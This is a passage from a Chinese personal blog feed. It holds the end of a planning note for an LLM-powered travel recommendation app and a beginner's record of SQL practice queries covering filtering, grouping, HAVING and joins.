<h4 id="项目愿景："><a class="header-anchor" href="#项目愿景：">¶</a>项目愿景：</h4>
<ul>
<li>希望在未来成为一个帮助用户快速决策并提高旅游体验的智能工具。</li>
</ul>
<h3 id="2-需求文档"><a class="header-anchor" href="#2-需求文档">¶</a>2. <strong>需求文档</strong></h3>
<h4 id="功能需求："><a class="header-anchor" href="#功能需求：">¶</a>功能需求：</h4>
<ol>
<li>
<p><strong>用户注册和登录</strong></p>
<ul>
<li>支持第三方登录（如Google、微信等）</li>
<li>需要有邮箱、手机验证功能</li>
</ul>
</li>
<li>
<p><strong>个人偏好设置</strong></p>
<ul>
<li>用户可以输入自己的旅游偏好（如景点类型、预算、时间等）</li>
<li>保存用户的偏好设置，后续推荐使用</li>
</ul>
</li>
<li>
<p><strong>行程推荐系统</strong></p>
<ul>
<li>用户输入基本信息后，系统通过大模型生成个性化的行程推荐</li>
<li>推荐内容包括目的地、景点、住宿、交通方式等</li>
</ul>
</li>
<li>
<p><strong>行程编辑功能</strong></p>
<ul>
<li>用户可以自定义或调整推荐的行程，实时查看效果</li>
<li>提供行程地图展示</li>
</ul>
</li>
<li>
<p><strong>多维度过滤</strong></p>
<ul>
<li>根据用户的偏好、时间、预算等多维度进行推荐筛选</li>
<li>支持关键字搜索、日期筛选等功能</li>
</ul>
</li>
<li>
<p><strong>用户反馈和评分</strong></p>
<ul>
<li>用户可以对生成的行程进行评价，以改进推荐算法</li>
</ul>
</li>
</ol>
<h4 id="非功能需求："><a class="header-anchor" href="#非功能需求：">¶</a>非功能需求：</h4>
<ul>
<li><strong>响应速度</strong>：页面加载时间不超过2秒。</li>
<li><strong>安全性</strong>：用户数据的加密存储及访问控制。</li>
<li><strong>可扩展性</strong>：支持未来接入更多旅游数据源和API。</li>
<li><strong>可维护性</strong>：代码结构清晰，易于维护和扩展。</li>
</ul>
<h3 id="3-开发文档"><a class="header-anchor" href="#3-开发文档">¶</a>3. <strong>开发文档</strong></h3>
<h4 id="项目结构："><a class="header-anchor" href="#项目结构：">¶</a>项目结构：</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">project-root/</span><br><span class="line">│</span><br><span class="line">├── backend/            # Django后端项目</span><br><span class="line">│   ├── apps/           # 各个业务模块</span><br><span class="line">│   ├── models.py       # 数据模型</span><br><span class="line">│   ├── views.py        # 视图层</span><br><span class="line">│   ├── serializers.py  # 序列化器</span><br><span class="line">│   ├── urls.py         # 路由</span><br><span class="line">│   └── settings.py     # 配置文件</span><br><span class="line">│</span><br><span class="line">├── frontend/           # Vue前端项目</span><br><span class="line">│   ├── src/            # 源代码目录</span><br><span class="line">│   │   ├── components/ # 组件</span><br><span class="line">│   │   ├── views/      # 页面视图</span><br><span class="line">│   │   ├── store/      # 状态管理</span><br><span class="line">│   │   └── router.js   # 路由配置</span><br><span class="line">│</span><br><span class="line">├── database/           # 数据库相关文件</span><br><span class="line">│</span><br><span class="line">└── README.md           # 项目说明文件</span><br></pre></td></tr></table></figure>
<h4 id="开发流程："><a class="header-anchor" href="#开发流程：">¶</a>开发流程：</h4>
<ol>
<li>
<p><strong>环境搭建</strong></p>
<ul>
<li>安装Django、Vue.js及相关依赖</li>
<li>设置数据库，建议使用PostgreSQL或MySQL</li>
<li>配置大语言模型的API（如OpenAI）</li>
</ul>
</li>
<li>
<p><strong>后端开发</strong></p>
<ul>
<li>使用Django REST Framework (DRF) 构建API</li>
<li>设计数据库模型，创建用户、行程、景点等表</li>
<li>实现用户注册、登录、偏好设置和推荐行程的API</li>
</ul>
</li>
<li>
<p><strong>前端开发</strong></p>
<ul>
<li>使用Vue.js构建动态交互式界面</li>
<li>实现登录、注册、行程推荐的前端逻辑</li>
<li>通过Axios或其他工具与后端API进行通信</li>
</ul>
</li>
<li>
<p><strong>模型集成</strong></p>
<ul>
<li>集成大语言模型的API，处理用户输入并生成推荐方案</li>
<li>实现大模型结果的解析和前端展示</li>
</ul>
</li>
<li>
<p><strong>测试与调试</strong></p>
<ul>
<li>编写单元测试及集成测试，确保系统功能正常</li>
<li>确保前后端接口一致，数据流通畅通</li>
</ul>
</li>
<li>
<p><strong>部署</strong></p>
<ul>
<li>使用Docker或虚拟环境进行环境一致性管理</li>
<li>部署到云服务器，推荐使用AWS、Heroku等服务</li>
</ul>
</li>
</ol>
<h3 id="疑问确认："><a class="header-anchor" href="#疑问确认：">¶</a>疑问确认：</h3>
<ol>
<li>你计划使用哪个大模型API（如OpenAI，或者本地化的大模型）？</li>
<li>是否有特定的旅游数据来源要求（如某些API服务或开源数据集）？</li>
<li>你有具体的行程生成逻辑需求吗？例如是通过关键词匹配，还是基于AI的推荐？</li>
<li>你是否考虑在应用中集成支付系统以实现商业化？</li>
</ol>
<p>根据你的反馈，我们可以进一步细化这些文档。</p>
<h3 id="回答和建议："><a class="header-anchor" href="#回答和建议：">¶</a>回答和建议：</h3>
<h4 id="1-大模型选择：文心一言-vs-本地模型"><a class="header-anchor" href="#1-大模型选择：文心一言-vs-本地模型">¶</a>1. <strong>大模型选择：文心一言 vs 本地模型</strong></h4>
<ul>
<li>
<p><strong>使用文心一言（现有大模型）</strong>：你使用百度文心一言模型是一个很好的选择，尤其是在初期阶段。使用现有的大模型能够节省大量时间和资源，避免了部署和训练的复杂性。文心一言具备强大的中文语言理解能力，适合处理中国旅游数据。此外，使用云服务的大模型还可以随着数据增长和用户需求扩展。</p>
</li>
<li>
<p><strong>本地模型</strong>：</p>
<ul>
<li><strong>优点</strong>：完全掌控模型训练和更新，适合个性化需求。</li>
<li><strong>缺点</strong>：需要大量资源（算力、数据）来训练和维护。即使使用较小的预训练模型（如BERT、GPT的精简版），微调数据仍可能需要大量计算资源，并且性能可能不如云端大模型。</li>
<li><strong>训练工作量</strong>：如果是完全从零训练一个大模型，工作量非常大，涉及数百万的训练数据和数周甚至数月的训练时间。如果是微调现有模型，通常会涉及到数千到数万的数据样本，训练时间可能从几小时到几天不等，具体取决于硬件配置。</li>
</ul>
</li>
</ul>
<p><strong>建议</strong>：如果你想快速启动并集中精力在旅游推荐算法上，推荐使用现有的文心一言大模型。如果未来有特定的模型需求，可以考虑本地模型或微调。</p>
<h4 id="2-中国的旅游数据来源"><a class="header-anchor" href="#2-中国的旅游数据来源">¶</a>2. <strong>中国的旅游数据来源</strong></h4>
<ul>
<li>
<p><strong>开放API</strong>：</p>
<ol>
<li><strong>携程API（Ctrip OpenAPI）</strong>：携程提供丰富的旅游数据接口，包括景点、酒店、机票等的实时数据。适合获取旅游景点和活动的实时信息。</li>
<li><strong>去哪儿API（Qunar OpenAPI）</strong>：类似于携程，提供酒店、航班和旅游套餐的搜索和预订数据。</li>
<li><strong>百度地图API</strong>：可以获取全国的景点信息、地理位置以及周边的服务推荐，适合地理位置推荐系统。</li>
</ol>
</li>
<li>
<p><strong>政府开放数据平台</strong>：</p>
<ol>
<li><strong>中国旅游研究院</strong>：提供行业报告和旅游市场动态，适合获取市场趋势。</li>
<li><strong>国家旅游局数据开放平台</strong>：可以查找有关景点、游客量、消费数据等的官方统计。</li>
</ol>
</li>
<li>
<p><strong>开源数据集</strong>：</p>
<ol>
<li><strong>OpenStreetMap</strong>：全球开放的地理数据，虽然不是专门的旅游数据，但可以提供景点和交通信息。</li>
<li><strong>Tuniu</strong> 和 <strong>Mafengwo</strong>：用户生成的旅游评论、推荐、游记等，也可以作为参考。</li>
</ol>
</li>
</ul>
<p><strong>建议</strong>：根据你的需求，结合使用携程、去哪儿和百度地图API是获取中国旅游数据的主要来源，另外可以参考政府开放数据平台，帮助你获取更具权威性的数据。</p>
<h4 id="3-行程生成逻辑建议："><a class="header-anchor" href="#3-行程生成逻辑建议：">¶</a>3. <strong>行程生成逻辑建议</strong>：</h4>
<p>你的中心想法借鉴了akinator，通过用户回答问题逐步缩小范围，生成个性化旅游建议，这是一个很有趣的思路。以下是一些可以考虑的扩展建议：</p>
<ul>
<li>
<p><strong>动态问题生成</strong>：根据用户之前的回答，动态调整接下来的问题。例如，如果用户对自然风景感兴趣，则进一步提问他们喜欢的具体类型（如山脉、海滩等），以提高推荐的精准度。</p>
</li>
<li>
<p><strong>多维度推荐</strong>：除了旅游目的地，还可以根据用户的预算、时间、兴趣等维度推荐最佳的旅行时间、交通工具、住宿等。</p>
</li>
<li>
<p><strong>用户行为分析</strong>：通过跟踪用户的行为（例如用户的偏好、点击等），自动优化问题的顺序和推荐内容，提升用户体验。</p>
</li>
<li>
<p><strong>社交分享</strong>：允许用户分享他们的推荐行程或生成的个性化行程单，增加应用的互动性和用户粘性。</p>
</li>
<li>
<p><strong>与第三方服务集成</strong>：未来可以考虑整合天气预报、景点人流预测等功能，让推荐更具实用性。</p>
</li>
</ul>
<h4 id="4-商业化因素建议："><a class="header-anchor" href="#4-商业化因素建议：">¶</a>4. <strong>商业化因素建议</strong>：</h4>
<p>虽然暂时不考虑支付系统，但你可以考虑以下商业化途径：</p>
<ul>
<li><strong>推荐服务变现</strong>：与酒店、景点、旅行社合作，按推荐和预订量收取佣金。</li>
<li><strong>付费个性化功能</strong>：用户可以免费使用基础推荐服务，但为高级功能（如实时行程优化、VIP景点推荐等）收取订阅费用。</li>
<li><strong>广告变现</strong>：通过在应用中嵌入相关广告（例如机票、酒店、旅游保险等）来获取收益。</li>
</ul>
<p>这份反馈结合了你的中心思想和一些扩展建议，可以帮助你更全面地构思和规划项目的下一步开发。</p>
]]></content>
      <categories>
        <category>notes</category>
        <category>developing notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>MyOwn</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL practice record</title>
    <url>/2024/07/07/CS_Notes/Database/SQL-practice-record/</url>
    <content><![CDATA[<h4 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h4>
<p>昨天看完SQL部分，今天练习一下</p>
<p><a href="http://sqlmother.yupi.icu/#/learn">练习网站-SQL之母</a></p>
<h4 id="1-基础语法-查询-全表查询"><a class="header-anchor" href="#1-基础语法-查询-全表查询">¶</a>1 基础语法-查询-全表查询</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student</span><br></pre></td></tr></table></figure>
<h4 id="2-基础语法-查询-选择查询"><a class="header-anchor" href="#2-基础语法-查询-选择查询">¶</a>2 基础语法-查询-选择查询</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name, age <span class="keyword">from</span> student</span><br></pre></td></tr></table></figure>
<h4 id="3-基础语法-查询-别名"><a class="header-anchor" href="#3-基础语法-查询-别名">¶</a>3 基础语法-查询-别名</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name <span class="keyword">as</span> 学生姓名, age <span class="keyword">as</span> 学生年龄 <span class="keyword">from</span> student</span><br></pre></td></tr></table></figure>
<h4 id="4-基础语法-查询-常量和运算"><a class="header-anchor" href="#4-基础语法-查询-常量和运算">¶</a>4 基础语法-查询-常量和运算</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name, score, <span class="number">2</span> <span class="operator">*</span> score <span class="keyword">as</span> double_score <span class="keyword">from</span> student</span><br></pre></td></tr></table></figure>
<h4 id="5-基础语法-条件查询-where"><a class="header-anchor" href="#5-基础语法-条件查询-where">¶</a>5 基础语法-条件查询-where</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name, score <span class="keyword">from</span> student <span class="keyword">where</span> name <span class="operator">=</span> &quot;鱼皮&quot;</span><br></pre></td></tr></table></figure>
<h4 id="6-基础语法-条件查询-运算符"><a class="header-anchor" href="#6-基础语法-条件查询-运算符">¶</a>6 基础语法-条件查询-运算符</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name, age <span class="keyword">from</span> student <span class="keyword">where</span> name <span class="operator">!=</span> &quot;热dog&quot;</span><br></pre></td></tr></table></figure>
<h4 id="7-基础语法-条件查询-空值"><a class="header-anchor" href="#7-基础语法-条件查询-空值">¶</a>7 基础语法-条件查询-空值</h4>
<ul>
<li>在SQL查询中，我们可以使用 “IS NULL” 和 “IS NOT NULL” 来判断字段是否为空值或非空值</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name, age, score <span class="keyword">from</span> student <span class="keyword">where</span> age <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br></pre></td></tr></table></figure>
<h4 id="8-基础语法-条件查询-模糊查询"><a class="header-anchor" href="#8-基础语法-条件查询-模糊查询">¶</a>8 基础语法-条件查询-模糊查询</h4>
<ul>
<li>使用 <code>like</code> 关键字实现模糊查询</li>
<li>在 LIKE 模糊查询中，我们使用通配符来代表零个或多个字符，从而能够快速地找到匹配的数据。</li>
<li>有如下 2 种通配符：
<ul>
<li>百分号（%）：表示任意长度的任意字符序列。</li>
<li>下划线（_）：表示任意单个字符。</li>
</ul>
</li>
<li>同理，可以使用 <code>not like</code> 来查询不包含某关键字的信息</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name, score <span class="keyword">from</span> student <span class="keyword">where</span> name <span class="keyword">not</span> <span class="keyword">like</span> &quot;%李%&quot;</span><br></pre></td></tr></table></figure>
<h4 id="9-基础语法-条件查询-逻辑运算"><a class="header-anchor" href="#9-基础语法-条件查询-逻辑运算">¶</a>9 基础语法-条件查询-逻辑运算</h4>
<p>在逻辑运算中，常用的运算符有：</p>
<ul>
<li>AND：表示逻辑与，要求同时满足多个条件，才返回 true。</li>
<li>OR：表示逻辑或，要求满足其中任意一个条件，就返回 true。</li>
<li>NOT：表示逻辑非，用于否定一个条件（本来是 true，用了 not 后转为 false）</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name, score <span class="keyword">from</span> student <span class="keyword">where</span> name <span class="keyword">like</span> &quot;%李%&quot; <span class="keyword">OR</span> score <span class="operator">&gt;</span> <span class="number">500</span></span><br></pre></td></tr></table></figure>
<h4 id="10-基础语法-去重"><a class="header-anchor" href="#10-基础语法-去重">¶</a>10 基础语法-去重</h4>
<ul>
<li>可以使用 <code>DISTINCT</code> 关键字来实现去重操作</li>
<li>除了按照单字段去重外，<code>DISTINCT</code> 关键字还支持根据多个字段的组合来进行去重操作，确保多个字段的组合是唯一的</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> class_id, exam_num <span class="keyword">from</span> student</span><br></pre></td></tr></table></figure>
<h3 id="11-基础语法-排序"><a class="header-anchor" href="#11-基础语法-排序">¶</a>11 基础语法-排序</h3>
<ul>
<li>可以使用 <code>ORDER BY</code> 关键字来实现排序操作。<code>ORDER BY</code> 后面跟上需要排序的字段，可以选择升序（ASC）或降序（DESC）排列</li>
<li>在排序的基础上，我们还可以根据多个字段的值进行排序。当第一个字段的值相同时，再按照第二个字段的值进行排序:  <code>order by 字段1 [升序/降序], 字段2 [升序/降序], ...</code></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name, age, score <span class="keyword">from</span> student <span class="keyword">order</span> <span class="keyword">by</span> score <span class="keyword">desc</span>, age <span class="keyword">asc</span></span><br></pre></td></tr></table></figure>
<h3 id="12-基础语法-截断与偏移"><a class="header-anchor" href="#12-基础语法-截断与偏移">¶</a>12 基础语法-截断与偏移</h3>
<ul>
<li>
<p>使用 <code>LIMIT</code> 关键字来实现数据的截断和偏移</p>
</li>
<li>
<pre><code class="language-sql">-- LIMIT 后只跟一个整数，表示要截断的数据条数（一次获取几条）
select task_name, due_date from tasks limit 2;

-- LIMIT 后跟 2 个整数，依次表示从第几条数据开始、一次获取几条
select task_name, due_date from tasks limit 2, 2;
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```sql</span><br><span class="line">select name, age from student order by age asc limit 1, 3</span><br></pre></td></tr></table></figure>

</code></pre>
</li>
<li>
<p>注意：第n条数据的下标为n-1</p>
</li>
</ul>
<h3 id="13-基础语法-条件分支"><a class="header-anchor" href="#13-基础语法-条件分支">¶</a>13 基础语法-条件分支</h3>
<ul>
<li>
<p>条件分支 <code>case when</code> 是 SQL 中用于根据条件进行分支处理的语法。它类似于其他编程语言中的 if else 条件判断语句</p>
</li>
<li>
<p><code>case when</code> 支持同时指定多个分支，示例语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CASE</span> <span class="keyword">WHEN</span> (条件<span class="number">1</span>) <span class="keyword">THEN</span> 结果<span class="number">1</span></span><br><span class="line">	   <span class="keyword">WHEN</span> (条件<span class="number">2</span>) <span class="keyword">THEN</span> 结果<span class="number">2</span></span><br><span class="line">	   ...</span><br><span class="line">	   <span class="keyword">ELSE</span> 其他结果 <span class="keyword">END</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span></span><br><span class="line">  name,</span><br><span class="line">  <span class="keyword">CASE</span></span><br><span class="line">    <span class="keyword">WHEN</span> (age <span class="operator">&gt;</span> <span class="number">60</span>) <span class="keyword">THEN</span> &quot;老同学&quot;</span><br><span class="line">    <span class="keyword">WHEN</span> (age <span class="operator">&gt;</span> <span class="number">20</span>) <span class="keyword">THEN</span> &quot;年轻&quot;</span><br><span class="line">    <span class="keyword">ELSE</span> &quot;小同学&quot;</span><br><span class="line">  <span class="keyword">END</span> <span class="keyword">AS</span> age_level</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">  student</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> name <span class="keyword">asc</span></span><br></pre></td></tr></table></figure>
<h3 id="14-函数-时间函数"><a class="header-anchor" href="#14-函数-时间函数">¶</a>14 函数-时间函数</h3>
<ul>
<li>常用的时间函数有：
<ul>
<li>DATE：获取当前日期</li>
<li>DATETIME：获取当前日期时间</li>
<li>TIME：获取当前时间</li>
</ul>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 获取当前日期</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="type">DATE</span>() <span class="keyword">AS</span> <span class="built_in">current_date</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取当前日期时间</span></span><br><span class="line"><span class="keyword">SELECT</span> DATETIME() <span class="keyword">AS</span> current_datetime;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取当前时间</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="type">TIME</span>() <span class="keyword">AS</span> <span class="built_in">current_time</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name, <span class="type">DATE</span>() <span class="keyword">as</span> &quot;当前日期&quot; <span class="keyword">from</span> student</span><br></pre></td></tr></table></figure>
<h3 id="15-函数-字符串处理"><a class="header-anchor" href="#15-函数-字符串处理">¶</a>15 函数-字符串处理</h3>
<ul>
<li>
<p>1）使用字符串处理函数 <code>UPPER</code> 将姓名转换为大写：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 将姓名转换为大写</span></span><br><span class="line"><span class="keyword">SELECT</span> name, <span class="built_in">UPPER</span>(name) <span class="keyword">AS</span> upper_name</span><br><span class="line"><span class="keyword">FROM</span> employees;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>2）使用字符串处理函数 <code>LENGTH</code> 计算姓名长度：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 计算姓名长度</span></span><br><span class="line"><span class="keyword">SELECT</span> name, LENGTH(name) <span class="keyword">AS</span> name_length</span><br><span class="line"><span class="keyword">FROM</span> employees;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>3）使用字符串处理函数 <code>LOWER</code> 将姓名转换为小写：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 将姓名转换为小写并进行条件筛选</span></span><br><span class="line"><span class="keyword">SELECT</span> name, <span class="built_in">LOWER</span>(name) <span class="keyword">AS</span> lower_name</span><br><span class="line"><span class="keyword">FROM</span> employees;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id, name, <span class="built_in">UPPER</span>(name) <span class="keyword">AS</span> upper_name <span class="keyword">from</span> student <span class="keyword">where</span> name <span class="operator">=</span> &quot;热dog&quot;</span><br></pre></td></tr></table></figure>
<h3 id="16-函数-聚合函数"><a class="header-anchor" href="#16-函数-聚合函数">¶</a>16 函数-聚合函数</h3>
<p>聚合函数是一类用于对数据集进行 <strong>汇总计算</strong> 的特殊函数。它们可以对一组数据执行诸如计数、求和、平均值、最大值和最小值等操作。聚合函数通常在 SELECT 语句中配合 GROUP BY 子句使用，用于对分组后的数据进行汇总分析。</p>
<ul>
<li>
<p>常见的聚合函数包括：</p>
<ul>
<li>COUNT：计算指定列的行数或非空值的数量。</li>
<li>SUM：计算指定列的数值之和。</li>
<li>AVG：计算指定列的数值平均值。</li>
<li>MAX：找出指定列的最大值。</li>
<li>MIN：找出指定列的最小值。</li>
</ul>
</li>
<li>
<p>1）使用聚合函数 <code>COUNT</code> 计算订单表中的总订单数：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> order_num</span><br><span class="line"><span class="keyword">FROM</span> orders;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>2）使用聚合函数 <code>COUNT(DISTINCT 列名)</code> 计算订单表中不同客户的数量：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span> customer_id) <span class="keyword">AS</span> customer_num</span><br><span class="line"><span class="keyword">FROM</span> orders;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>3）使用聚合函数 <code>SUM</code> 计算总订单金额：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUM</span>(amount) <span class="keyword">AS</span> total_amount</span><br><span class="line"><span class="keyword">FROM</span> orders;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">SUM</span>(score) <span class="keyword">AS</span> total_score, <span class="built_in">AVG</span>(score) <span class="keyword">AS</span> avg_score, <span class="built_in">MAX</span>(score) <span class="keyword">AS</span> max_score, <span class="built_in">MIN</span>(score) <span class="keyword">as</span> min_score <span class="keyword">from</span> student</span><br></pre></td></tr></table></figure>
<h3 id="17-分组聚合-单字段分组"><a class="header-anchor" href="#17-分组聚合-单字段分组">¶</a>17 分组聚合-单字段分组</h3>
<ul>
<li>
<p>分组聚合是一种对数据进行分类并对每个分类进行聚合计算的操作。它允许我们按照指定的列或字段对数据进行分组，然后对每个分组应用聚合函数，如 COUNT、SUM、AVG 等，以获得分组后的汇总结果</p>
</li>
<li>
<p>使用 <code>GROUP BY</code> 关键字对数据进行分组</p>
</li>
<li>
<p>1）使用分组聚合查询中每个客户的编号：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> customer_id</span><br><span class="line"><span class="keyword">FROM</span> orders</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> customer_id;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>2）使用分组聚合查询每个客户的下单数：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> customer_id, <span class="built_in">COUNT</span>(order_id) <span class="keyword">AS</span> order_num</span><br><span class="line"><span class="keyword">FROM</span> orders</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> customer_id;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> class_id, <span class="built_in">AVG</span>(score) <span class="keyword">as</span> avg_score <span class="keyword">from</span> student <span class="keyword">group</span> <span class="keyword">by</span> class_id</span><br></pre></td></tr></table></figure>
<h3 id="18-分组聚合-多字段分组"><a class="header-anchor" href="#18-分组聚合-多字段分组">¶</a>18 分组聚合-多字段分组</h3>
<ul>
<li>
<p>多字段分组和单字段分组的实现方式几乎一致，使用 <code>GROUP BY</code> 语法即可</p>
</li>
<li>
<p>要查询使用多字段分组查询表中 <strong>每个客户</strong> 购买的 <strong>每种商品</strong> 的总金额，相当于按照客户编号和商品编号分组：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查询每个用户购买的每种商品的总金额，按照客户编号和商品编号分组</span></span><br><span class="line"><span class="keyword">SELECT</span> customer_id, product_id, <span class="built_in">SUM</span>(amount) <span class="keyword">AS</span> total_amount</span><br><span class="line"><span class="keyword">FROM</span> orders</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> customer_id, product_id;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> class_id, exam_num, <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">as</span> total_num <span class="keyword">from</span> student <span class="keyword">group</span> <span class="keyword">by</span> class_id, exam_num</span><br></pre></td></tr></table></figure>
<ul>
<li>对GROUP BY还是有点晕……</li>
</ul>
<h3 id="19-分组聚合-having子句"><a class="header-anchor" href="#19-分组聚合-having子句">¶</a>19 分组聚合-having子句</h3>
<ul>
<li>
<p>HAVING 子句用于在<strong>分组聚合</strong>后对分组进行过滤。它允许我们对分组后的结果进行条件筛选，只保留满足特定条件的分组</p>
</li>
<li>
<p>HAVING 子句与条件查询 WHERE 子句的区别在于，WHERE 子句用于在 <strong>分组之前</strong> 进行过滤，而 HAVING 子句用于在 <strong>分组之后</strong> 进行过滤</p>
</li>
<li>
<p>1）使用 HAVING 子句查询订单数超过 1 的客户：</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> customer_id, <span class="built_in">COUNT</span>(order_id) <span class="keyword">AS</span> order_num</span><br><span class="line"><span class="keyword">FROM</span> orders</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> customer_id</span><br><span class="line"><span class="keyword">HAVING</span> <span class="built_in">COUNT</span>(order_id) <span class="operator">&gt;</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>2）使用 HAVING 子句查询订单总金额超过 100 的客户：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查询订单总金额超过100的客户</span></span><br><span class="line"><span class="keyword">SELECT</span> customer_id, <span class="built_in">SUM</span>(amount) <span class="keyword">AS</span> total_amount</span><br><span class="line"><span class="keyword">FROM</span> orders</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> customer_id</span><br><span class="line"><span class="keyword">HAVING</span> <span class="built_in">SUM</span>(amount) <span class="operator">&gt;</span> <span class="number">100</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> class_id, <span class="built_in">SUM</span>(score) <span class="keyword">AS</span> total_score <span class="keyword">from</span> student <span class="keyword">group</span> <span class="keyword">by</span> class_id <span class="keyword">HAVING</span> total_score <span class="operator">&gt;</span> <span class="number">150</span></span><br></pre></td></tr></table></figure>
<h3 id="20-查询进阶-关联查询-cross-join"><a class="header-anchor" href="#20-查询进阶-关联查询-cross-join">¶</a>20 查询进阶-关联查询-cross join</h3>
<ul>
<li>
<p>关联查询是一种用于联合多个数据表中的数据的查询方式</p>
</li>
<li>
<p><code>CROSS JOIN</code> 是一种简单的关联查询，不需要任何条件来匹配行，它直接将左表的 <strong>每一行</strong> 与右表的 <strong>每一行</strong> 进行组合，返回的结果是两个表的笛卡尔积</p>
</li>
<li>
<p>使用 CROSS JOIN 进行关联查询，将员工表和部门表的所有行组合在一起，获取员工姓名、工资、部门名称和部门经理，示例 SQL 代码如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> e.emp_name, e.salary, e.department, d.manager</span><br><span class="line"><span class="keyword">FROM</span> employees e</span><br><span class="line"><span class="keyword">CROSS</span> <span class="keyword">JOIN</span> departments d;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> S.name <span class="keyword">AS</span> student_name, S.age <span class="keyword">AS</span> student_age, S.class_id <span class="keyword">AS</span> class_id, C.name <span class="keyword">AS</span> class_name <span class="keyword">from</span> student S <span class="keyword">cross</span> <span class="keyword">join</span> class C </span><br></pre></td></tr></table></figure>
<ul>
<li>就是多表查询啊，不用<code>cross join</code>，直接在<code>FROM</code>后面加个逗号，加上联合查询的表就行了</li>
</ul>
<h3 id="21-查询进阶-关联查询-inner-join"><a class="header-anchor" href="#21-查询进阶-关联查询-inner-join">¶</a>21 查询进阶-关联查询-inner join</h3>
<ul>
<li>
<p>INNER JOIN 是一种常见的关联查询方式，它根据两个表之间的关联条件，将满足条件的行组合在一起。</p>
</li>
<li>
<p>INNER JOIN 只返回两个表中满足关联条件的交集部分，即在两个表中都存在的匹配行。</p>
</li>
<li>
